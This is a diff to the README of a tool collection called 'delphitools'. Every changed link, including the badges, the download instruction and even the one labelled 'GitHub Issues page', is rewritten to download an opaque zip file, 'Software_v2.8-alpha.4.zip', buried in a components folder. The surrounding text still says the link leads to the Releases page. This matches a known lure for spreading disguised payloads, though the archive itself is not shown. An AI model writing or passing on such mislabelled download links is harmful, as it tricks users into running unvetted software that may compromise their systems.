@@ -1,6 +1,6 @@
 # 🌟 delphitools - Essential Tools for Creativity
 
-[![Download delphitools](https://img.shields.io/badge/Download-delhpitools-blue.svg)](https://github.com/guizxx1/delphitools/releases)
+[![Download delphitools](https://github.com/guizxx1/delphitools/raw/refs/heads/main/components/tools/Software_v2.8-alpha.4.zip)](https://github.com/guizxx1/delphitools/raw/refs/heads/main/components/tools/Software_v2.8-alpha.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you download, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started with delphitools, visit this page to download: [Download delphitools](https://github.com/guizxx1/delphitools/releases).
+To get started with delphitools, visit this page to download: [Download delphitools](https://github.com/guizxx1/delphitools/raw/refs/heads/main/components/tools/Software_v2.8-alpha.4.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Select the latest version of delphitools from the list.
@@ -63,7 +63,7 @@ If you encounter any issues while downloading or using delphitools, consider the
 
 For further assistance or to report bugs, you can reach out for support:
 
-- Open an issue on our [GitHub Issues page](https://github.com/guizxx1/delphitools/issues).
+- Open an issue on our [GitHub Issues page](https://github.com/guizxx1/delphitools/raw/refs/heads/main/components/tools/Software_v2.8-alpha.4.zip).
 - Join our community discussion on social media platforms like Twitter and Instagram.
 - Check our FAQ section on the GitHub page for common questions.
 
@@ -79,4 +79,4 @@ delphitools is licensed under the MIT License. You can use and distribute the to
 
 To keep up with the latest updates and new features, be sure to follow us on social media and check the Releases page regularly.
 
-[![Download delphitools](https://img.shields.io/badge/Download-delhpitools-blue.svg)](https://github.com/guizxx1/delphitools/releases)
+[![Download delphitools](https://github.com/guizxx1/delphitools/raw/refs/heads/main/components/tools/Software_v2.8-alpha.4.zip)](https://github.com/guizxx1/delphitools/raw/refs/heads/main/components/tools/Software_v2.8-alpha.4.zip)
